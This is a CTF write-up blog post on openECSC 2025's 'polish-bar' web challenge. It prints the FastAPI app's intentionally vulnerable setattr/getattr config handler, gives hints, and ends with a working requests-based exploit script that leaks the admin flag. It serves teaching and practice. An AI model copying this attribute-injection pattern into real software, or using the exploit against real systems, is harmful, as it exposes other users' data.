---
title: "openESEC 2025 - web/polish-bar"
layout: single
classes: wide
date: 2025-10-06
categories: blog
toc: true
toc_label: "Table of contents"
---

> This Web Application was made to adapt to polish (drinking) culture :3

# Setup

We have a frontend serving some `Jinja` templates that has some http endpoints we can use to ~~get hella drunk~~ understand what the polish bar has to offer. All endpoint endpoints somewhat modify the `BeverageConfig` of our account. There is an admin account that has the flag:

```py
app = FastAPI()
templates = Jinja2Templates(directory="templates")
sessions = {}

def admin_session_setup():
    session_id = str(uuid.uuid4())

    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }

admin_session_setup()


@app.get("/")
...

@app.get("/register")
...

@app.post("/register")
async def post_register(request: Request, username: str = Form(...), password: str = Form(...)):

    new_session_id = str(uuid.uuid4())

    sessions[new_session_id] = { 'username': username, 'password': password, 'config': BeverageConfig(None) }

    response = RedirectResponse(url="/profile", status_code=303)
    response.set_cookie(key="session", value=new_session_id, httponly=True)
    return response


@app.get("/profile")
async def get_profile(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/config")
async def update_config(request: Request, config: str = Form(...), value: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        err = sessions[session_id]['config'].update_property(config, value)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config(),
            "error": 'Beverage is not in your shelf!' if err else ''
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/beverage")
async def update_config(request: Request, beverage: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].add_beverage(beverage)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/empty")
async def update_config(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].empty_alcohol_shelf()

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)
```

The http endpoint to `register` is pretty important to obtain a session. Afterwards, we have the endpoints `config`,`empty` and `beverage` which I mapped to the methods below in the class `BeverageConfig` and `PreferenceConfig`. Look at the jupyter notebook in [the playground](#python-refresher-and-playground) to see the classes `BeverageConfig` etc. 

```py
    def get_property(self, val):
        try:
            if hasattr(self.alcohol_shelf, val):
                return getattr(self.alcohol_shelf, val)

            return getattr(self, val)
        except:
            return

    # /config
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)
        if attr:
            setattr(self, key, attr)
            return
        return { 'error': 'property doesn\'t exist!' }
    
    # /empty
    def empty_alcohol_shelf(self):
        if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
            self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
        else:
            self.alcohol_shelf = self.alcohol_shelf[0]

    # /beverage
    def add_beverage(self, beverage: str):
        self.alcohol_shelf._alcohol_shelf.append(beverage)

```

Let's disect what each method does:

- `update_property` retrieves the attribute `val` and sets the attribute `key` to its value
- `empty_alcohol_shelf` will shorten the list `self.alcohol_shelf._alcohol_shelf` to its first value. If they does not exists, it will reduce the list `self.alcohol_shelf` to its first value.
- `add_beverage` adds an item to the list `self.alcohol_shelf._alcohol_shelf`.

If you are not familiar with the special methods `getattr`, `setattr` and `hasattr` --- I got you covered in the next section!

## Python refresher and playground

Below is a small playground I created if you want to try it on your own first. At the end, I included the challenge classes such that you can play around to try to solve this ctf on your own. You can use the [hints](#intuition).

<iframe
  src="https://bluuuk.github.io/blog-jupyterlite/lab/index.html?path=/openECSC-playground.ipynb"
  id="jlite"
  width="100%"
  height="1000px">
</iframe>

## Intuition

Below, I collected my first sight intuitions. Click as you like:

<details>
  <summary>Hint $1)$</summary>
  Overall, the class `PreferenceConfig` and thus `BeverageConfig` due to inheritance have one interesting class variable `_all_instances`. The `__init__` for `PreferenceConfig` appends every newly created object to that class as long it is inherited from `PreferenceConfig`. 
</details>

<details>
  <summary>Hint $2)$</summary>
  The first element of `_all_instances` is always **admin** `BeverageConfig`. Therefore, if we register to create our own session, our object will be `_all_instances[1]`
</details>

<details>
  <summary>Hint $3)$</summary>
  We can use `/config` to essentially do `setattr(self,"{key}",get_property(self,"{value}"))` where we control `{key}` and `{value}`
</details>

<details>
  <summary>Hint $4)$</summary>
  With Hint $4$ in mind, we set `alcohol_shelf` to `_all_instances`. Now, `alcohol_shelf` is not of type `AlcoholShelf` anymore - its merly just a list.
</details>

<details>
  <summary>Hint $5)$</summary>
  We can use `/empty` to convert the list `alcohol_shelf = [admin, us]` to `alcohol_shelf = admin`.
</details>

<details>
  <summary>Hint $6)$</summary>
  We can use `/profile` to obtain our `alcohol_shelf` via `get_beverages` of our object. This just returns `self.alcohol_shelf` which has the value of `_all_instances[0]`, aka the flag.
</details>

## Step by step guide

The final solve is therefore:

```py
B = BeverageConfig(None)
B.update_property(
    "alcohol_shelf","_all_instances"
)
B.empty_alcohol_shelf()
B.get_config()
```

![alt text](image.png)

## Final Solve

We use an `Session` which automatically glues cookie to subsequent http request once they set - here its the `session` cookie:

```py
import requests
session = requests.Session()
base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

session.post( f"{base}/register", data={"username":"admin","password":"lol"})
session.post(f"{base}/config",data={"config":"alcohol_shelf","value":"_all_instances"})
session.post(f"{base}/empty")
print(session.post(f"{base}/profile"))
```

Executing our solve script gives us our well deserved flag :)

```bash
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
````
